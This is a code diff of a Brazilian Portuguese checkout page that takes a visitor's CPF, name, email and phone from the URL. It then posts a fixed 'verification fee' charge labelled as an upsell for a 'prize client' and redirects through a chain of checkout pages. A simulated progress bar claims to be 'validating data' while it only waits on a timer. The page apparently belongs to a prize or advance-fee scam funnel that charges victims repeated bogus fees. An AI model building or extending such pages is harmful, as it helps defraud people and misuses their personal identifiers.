@@ -1,11 +1,6 @@
 <!DOCTYPE html><html lang="pt-BR"><head>
     
-    <script
-  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-  data-utmify-prevent-subids
-  async
-  defer
-></script>
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
 
 <script>
   window.pixelId = "67b55551ab32c3b13ad4ec9d";
@@ -360,28 +355,31 @@
 </style>
 
 <script>
-  // Obter dados do localStorage
-  let nome = "Nome não informado";
-  let cpf = "";
-  let email = "";
-  let telefone = "";
+  // --- CÓDIGO MODIFICADO AQUI ---
 
+  // Obter parâmetros da URL
+  const params = new URLSearchParams(window.location.search);
+
+  // O CPF é informado exclusivamente pelo parâmetro 'document'
+  let cpf = params.get("document") || "";
+
+  // Outros dados podem vir da URL ou do localStorage como fallback
+  let nome = params.get("name") || "Nome não informado";
+  let email = params.get("email") || "";
+  let telefone = params.get("telephone") || "";
+
+  // Tenta sobrescrever o nome com dados do localStorage, se existirem
   try {
     const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));
-    if (dadosUsuario) {
-      nome = dadosUsuario.nome || "Nome não informado";
-      cpf = dadosUsuario.cpf || "";
+    if (dadosUsuario && dadosUsuario.nome) {
+      nome = dadosUsuario.nome;
     }
     console.log('Dados carregados do localStorage:', dadosUsuario);
   } catch (error) {
     console.error('Erro ao carregar dados do localStorage:', error);
-    // Fallback para URL se localStorage não funcionar
-  const params = new URLSearchParams(window.location.search);
-    nome = params.get("name") || "Nome não informado";
-    cpf = params.get("cpf") || "";
-    email = params.get("email") || "";
-    telefone = params.get("telephone") || "";
+    // Se der erro, os dados da URL já foram carregados como fallback
   }
+
 
   function formatCPF(cpf) {
     const clean = cpf.replace(/\D/g, "");
@@ -472,26 +470,146 @@
     }, 50);
   }
   function redirecionarParaPagamento() {
-      // URL de destino
-      const baseUrl = 'https://pay.ultimo-passo.space/zj6aGnA4p5YZwlK';
-
-      // Pega todos os parâmetros da URL atual (ex: utm_source, utm_medium, etc.)
-      const currentParams = new URLSearchParams(window.location.search).toString();
-
-      // Monta a URL final, adicionando os parâmetros da URL atual ao link de destino
-      let redirectUrl = baseUrl;
-      if (currentParams) {
-          // Adiciona '?' se a URL base não tiver, ou '&' se já tiver, para concatenar os parâmetros
-          if (baseUrl.includes('?')) {
-              redirectUrl += '&' + currentParams;
-          } else {
-              redirectUrl += '?' + currentParams;
-          }
+    // Mostrar modal de loading
+    const loadingModal = document.getElementById('loadingModal');
+    const progressFill = document.getElementById('progressFill');
+    const progressText = document.getElementById('progressText');
+    const loadingText = document.getElementById('loadingText');
+    
+    loadingModal.classList.add('show');
+    
+    // Simular progresso inicial
+    let progress = 0;
+    const progressInterval = setInterval(() => {
+      if (progress < 30) {
+        progress += Math.random() * 5;
+        progressFill.style.width = progress + '%';
+        progressText.textContent = Math.round(progress) + '%';
       }
-      
-      // Redireciona o navegador do usuário para o link final instantaneamente
-      window.location.href = redirectUrl;
-  }
+    }, 100);
+    
+    // Capturar parâmetros UTM da URL (REMOVENDO o ID anterior se existir)
+    const urlParams = new URLSearchParams(window.location.search);
+    
+    // IMPORTANTE: Remover o parâmetro 'id' para evitar conflito com transação anterior
+    urlParams.delete('id');
+    
+    const utmParams = {
+        utm_source: urlParams.get('utm_source') || '',
+        utm_medium: urlParams.get('utm_medium') || '',
+        utm_campaign: urlParams.get('utm_campaign') || '',
+        utm_content: urlParams.get('utm_content') || '',
+        utm_term: urlParams.get('utm_term') || '',
+        xcod: urlParams.get('xcod') || '',
+        sck: urlParams.get('sck') || ''
+    };
+    
+    // Criar FormData para enviar parâmetros
+    const formData = new FormData();
+    
+    // Obter dados do localStorage para nome e CPF
+    let nomeCliente = 'Cliente Premiação';
+    try {
+        const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));
+        if (dadosUsuario && dadosUsuario.nome) {
+            nomeCliente = dadosUsuario.nome;
+        }
+    } catch (error) {
+        console.error('Erro ao carregar dados do localStorage para pagamento:', error);
+    }
+    
+    // Adicionar valor e dados do produto ao FormData
+    formData.append('valor', 4740);
+    formData.append('nome', nomeCliente);
+    formData.append('whatsapp', '(11) 99999-9999');
+    formData.append('produto', 'taxa_verificacao_upsell3'); // Identificador específico para o upsell3
+    
+    // Adicionar timestamp para garantir transação única
+    formData.append('timestamp', Date.now());
+    
+    // Adicionar parâmetros UTM ao FormData
+    Object.keys(utmParams).forEach(key => {
+        if (utmParams[key]) {
+            formData.append(key, utmParams[key]);
+        }
+    });
+    
+    console.log('Enviando dados para pagamento:', {
+        valor: 4740,
+        nome: nomeCliente,
+        produto: 'taxa_verificacao_upsell3'
+    });
+    
+    // Atualizar progresso para 50%
+    setTimeout(() => {
+      clearInterval(progressInterval);
+      progress = 50;
+      progressFill.style.width = progress + '%';
+      progressText.textContent = progress + '%';
+      loadingText.textContent = 'Validando dados...';
+    }, 1000);
+    
+    // Fazer requisição para pagamento.php
+    fetch('../checkoutup2/pagamento.php', {
+        method: 'POST',
+        body: formData
+    })
+        .then(response => {
+            // Progresso 70%
+            progress = 70;
+            progressFill.style.width = progress + '%';
+            progressText.textContent = progress + '%';
+            loadingText.textContent = 'Gerando transação...';
+            
+            if (!response.ok) {
+                throw new Error('Erro ao processar pagamento');
+            }
+            return response.json();
+        })
+        .then(data => {
+            console.log('Resposta do pagamento:', data);
+            
+            // Progresso 90%
+            progress = 90;
+            progressFill.style.width = progress + '%';
+            progressText.textContent = progress + '%';
+            loadingText.textContent = 'Finalizando...';
+            
+            // Redirecionar para a página de checkout com os dados do pagamento
+            if (data.token) {
+                // Progresso 100%
+                setTimeout(() => {
+                  progress = 100;
+                  progressFill.style.width = progress + '%';
+                  progressText.textContent = progress + '%';
+                  loadingText.textContent = 'Redirecionando...';
+                  
+                  // Capturar parâmetros UTM atuais da URL (SEM o ID anterior)
+                  const urlParamsClean = new URLSearchParams(window.location.search);
+                  urlParamsClean.delete('id'); // Remove o ID anterior
+                  const currentParams = urlParamsClean.toString();
+                  
+                  // Criar URL limpa com apenas o novo ID
+                  const checkoutUrl = currentParams ? `../checkoutup3/?id=${data.token}&${currentParams}` : `../checkoutup3/?id=${data.token}`;
+                  
+                  console.log('Redirecionando para nova transação de taxa de verificação:', checkoutUrl);
+                  
+                  // Aguardar um pouco antes de redirecionar
+                  setTimeout(() => {
+                    window.location.href = checkoutUrl;
+                  }, 800);
+                }, 500);
+            } else {
+                throw new Error('Token de transação não encontrado na resposta');
+            }
+        })
+        .catch(error => {
+            console.error('Erro:', error);
+            clearInterval(progressInterval);
+            loadingModal.classList.remove('show');
+            alert('Ocorreu um erro ao processar a taxa de verificação. Por favor, tente novamente.');
+        });
+}
 
 </script>
 
